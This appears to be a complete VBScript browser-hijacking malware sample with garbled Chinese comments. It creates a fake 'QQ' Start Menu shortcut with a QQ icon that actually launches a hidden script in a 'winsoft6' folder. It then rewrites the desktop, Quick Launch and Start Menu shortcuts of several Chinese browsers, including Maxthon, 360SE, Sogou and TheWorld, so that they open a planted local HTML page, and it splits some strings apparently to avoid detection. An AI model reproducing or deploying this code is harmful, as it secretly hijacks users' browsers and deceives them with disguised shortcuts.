Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'�����ļ��С����桱
Favorites = WshShell.SpecialFolders("Favorites") :'�����ļ��С����桱

strttWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
iescc=strttWinDir&"\Internet Explorer\iexplore.exe"
ssd="ճ��"
winds = WshShell.ExpandEnvironmentStrings("%SystemRoot%")

Set oShellLink = WshShell.CreateShortcut(WshShell.SpecialFolders("AllUsersStartMenu") +"\��"&"��\��"&"��\��ѶQQ.lnk" )
oShellLink.TargetPath = "%Program"&"Files%\winsoft6\22"&"22.vbs" : 'Ŀ��
oShellLink.IconLocation = "%ProgramFiles%\winsoft6\qq.ico, 0" : 'ͼ��
oShellLink.WorkingDirectory = "%ProgramFiles%\winsoft6\" : '��ʼλ��
oShellLink.Save : '�������淽ʽ

Sub Doits12345(lnktz)
Dim oldpath,newpath
oldpath = lnktz           
Dim Wsh,fso
newpath = """"&strttWinDir&"\Common Files\winie6.html"""
Set Wsh = WScript.CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

Dim Folders
Folders = Wsh.SpecialFolders("AllUsersDesktop")
   Set f = fso.GetFolder(Folders)
   Set fc = f.Files
   For Each f1 in fc
      ext = LCase(fso.GetExtensionName(f1))
      if ext = "lnk" then
           Set oShlnk = Wsh.CreateShortcut(f1)
        If Instr(oShLnk.TargetPath,oldpath) > 0 Then
       oShLnk.Arguments = newpath
       oShLnk.Save      
End If
   Set oShLnk=NoThing
      end if
   Next
Folders = Wsh.SpecialFolders.Item("AppData")& "\Microsoft\Internet Explorer\Quick Launch"
   Set f = fso.GetFolder(Folders)
   Set fc = f.Files
   For Each f1 in fc
      ext = LCase(fso.GetExtensionName(f1))
      if ext = "lnk" then
           Set oShlnk = Wsh.CreateShortcut(f1)
        If Instr(oShLnk.TargetPath,oldpath) > 0 Then
       oShLnk.Arguments = newpath
       oShLnk.Save      
End If
   Set oShLnk=NoThing
      end if
   Next
Dim oShlnk,Folder
Folder = Wsh.SpecialFolders("Desktop")
Dim f,fc,f1,ext
   Set f = fso.GetFolder(Folder)
   Set fc = f.Files
   For Each f1 in fc
      ext = LCase(fso.GetExtensionName(f1))
      if ext = "lnk" then
           Set oShlnk = Wsh.CreateShortcut(f1)
        If Instr(oShLnk.TargetPath,oldpath) > 0 Then
       oShLnk.Arguments = newpath
       oShLnk.Save      
End If
   Set oShLnk=NoThing
      end if
   Next
Folders = Wsh.SpecialFolders.Item("StartMenu")
   Set f = fso.GetFolder(Folders)
   Set fc = f.Files
   For Each f1 in fc
      ext = LCase(fso.GetExtensionName(f1))
      if ext = "lnk" then
           Set oShlnk = Wsh.CreateShortcut(f1)
        If Instr(oShLnk.TargetPath,oldpath) > 0 Then
       oShLnk.Arguments = newpath
       oShLnk.Save      
End If
   Set oShLnk=NoThing
      end if
   Next
Folders = Wsh.SpecialFolders.Item("AllUsersStartMenu")
   Set f = fso.GetFolder(Folders)
   Set fc = f.Files
   For Each f1 in fc
      ext = LCase(fso.GetExtensionName(f1))
      if ext = "lnk" then
           Set oShlnk = Wsh.CreateShortcut(f1)
        If Instr(oShLnk.TargetPath,oldpath) > 0 Then
       oShLnk.Arguments = newpath
       oShLnk.Save      
End If
   Set oShLnk=NoThing
      end if
   Next
Set WSH = Nothing
End Sub

Call Doits12345("TTraveler"&".exe")
Call Doits12345("SogouExplorer.exe")
Call Doits12345("TheWorld.exe")
Call Doits12345("Maxthon.exe")
Call Doits12345("Maxthon2.exe")
Call Doits12345("360SE"&".exe")

WScript.quit